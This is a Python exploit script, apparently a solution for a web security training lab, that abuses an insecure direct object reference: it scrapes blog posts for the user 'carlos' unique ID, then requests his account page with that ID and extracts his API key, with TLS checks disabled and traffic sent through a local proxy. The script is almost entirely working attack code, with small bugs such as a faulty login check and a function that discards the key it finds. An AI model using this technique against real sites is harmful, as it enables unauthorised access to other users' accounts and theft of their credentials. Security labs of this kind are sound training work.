import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def search_carlos_unique_id(s, url):
    print("[+] Iterating through blog posts looking for carlos unique id...")
    for i in range(1,10):
        posts_url = url + "/post?postId=%i" % i
        r = s.get(posts_url, verify=False, proxies=proxies)
        if "carlos" in r.text:
            carlos_id = re.search(r"\/blogs\?userId=([A-Z,a-z,0-9,-]+)", r.text).group(1)
            print("[+] Carlos' ID found! %s" % carlos_id)
            return carlos_id
    print("[-] Something went wrong! Could not find posts with carlos' ID")
    sys.exit(-1)


def get_carlos_api_key(s, url, carlos_unique_id):
    account_url = url + "/my-account?id=" + carlos_unique_id
    r = s.get(account_url, verify=False, proxies=proxies)
    if "Log out" and "carlos" in r.text:
        print("[+] Accessing now carlos' account area and extracting his API Key")
        api_key = re.search(r"Your API Key is: ([A-Z,a-z,0-9]+)", r.text).group(1)
        print("[+] Found it! %s" % api_key)
        return
    print("[-] Something went wrong! Could not access carlos account or the API Key is missing!")
    sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    print("\n[+] Lab: User ID controlled by request parameter, with unpredictable user IDs")
    print("[+] Horizontal access control vulnerability")
    print("[+] The web application uses randomized users' ID to mitigate access control vulnerability caused bu predictable users' ID")
    print("[+] The web application is vulnerable because the users' ID appears in public pages associated to the name of thair respective users\n")

    carlos_unique_id = search_carlos_unique_id(s, url)
    get_carlos_api_key(s, url, carlos_unique_id)



if __name__ == "__main__":
    main()